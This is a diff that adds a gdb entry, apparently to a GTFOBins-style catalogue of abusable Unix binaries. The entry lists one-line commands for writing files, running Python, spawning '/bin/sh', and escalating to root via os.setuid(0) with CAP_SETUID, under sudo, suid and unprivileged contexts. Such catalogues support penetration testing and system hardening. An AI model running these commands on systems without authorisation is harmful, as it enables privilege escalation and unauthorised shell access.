@@ -1,0 +1,33 @@
+---
+functions:
+  file-write:
+  - code: |-
+      gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  inherit:
+  - code: |-
+      gdb -nx -ex 'python ...' -ex quit
+    comment: |-
+      This allows to run Python code (`...`).
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    from: python
+  shell:
+  - code: |-
+      gdb -nx -ex '!/bin/sh' -ex quit
+    contexts:
+      capabilities:
+        code: |-
+          gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
+        list:
+        - CAP_SETUID
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
